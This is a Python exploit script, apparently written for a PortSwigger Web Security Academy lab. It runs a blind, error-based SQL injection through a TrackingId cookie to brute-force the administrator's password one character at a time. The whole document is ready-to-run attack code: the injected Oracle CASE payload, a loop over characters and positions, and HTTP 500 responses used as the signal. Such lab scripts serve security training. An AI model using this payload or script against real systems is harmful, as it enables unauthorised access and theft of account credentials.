
import pwn
from pwn import *
import requests, signal, time, pdb, sys, string


## Ctrl C
def def_handler(sig, frame):
    print("\n\n SALIENDO...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a2a0055038944cb807c08a800c50067.web-security-academy.net/"
characters= string.ascii_lowercase + string.digits

def makeRequest():

   
    result = "" 

    p1 = log.progress("Fuerza Bruta")
    p1.status("Have a nice day :3")
    
    
    time.sleep(2)

    p2 = log.progress("Passwordd")
    
    for position in range(1,21):
        
        ##BUCLE ANIDADO   500 Internal Server ERROR
        for character in characters:
            cookies = {
                'TrackingId' : "7j7dch9zORhkkndn'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character),
                'session' : '2Q4IiHVLyPxNpRcSmGsDIGOCootdboZn'
            }

            p1.status(cookies['TrackingId'])


            r = requests.get(main_url, cookies=cookies)

            if r.status_code == 500:
                
                result += character
                p2.status(result)
                break
                

if __name__ =='__main__':

    makeRequest()

